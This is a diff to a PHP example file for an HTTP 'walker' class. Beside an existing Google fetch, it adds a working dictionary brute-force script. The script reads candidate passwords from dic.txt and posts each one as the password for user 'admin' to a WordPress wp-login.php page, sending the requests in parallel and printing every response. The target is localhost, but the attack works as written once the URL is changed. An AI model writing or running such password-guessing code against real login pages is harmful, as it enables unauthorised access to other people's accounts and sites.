@@ -15,3 +15,38 @@
 	$url = "http://www.google.com/";
 	$html = $w -> run ( $url, $op);
 	print $html;
+?>
+
+
+<?php 
+
+	$w = new walker();
+
+  $op = array(
+    "ajax" => false,
+    "debug" => 1,
+    "method" => "POST",
+    "data" => array(
+      "usr"=>"admin",
+      "pwd"=>"xd",
+    ),
+  );
+
+  $url = "http://localhost/wordpress/wp-login.php";
+
+  $dic = fopen("dic.txt","r");
+
+	$w -> multi_init();
+
+  while ( $pass = fgets($dic) ){
+    $op['data']['pwd'] = trim($pass);
+    $w -> multi_opts ($url, $op);
+  }
+	
+	$res = $w -> multi_run();
+
+	foreach ($res as $key => $html){
+		
+		print_r ($html); 
+		
+	}
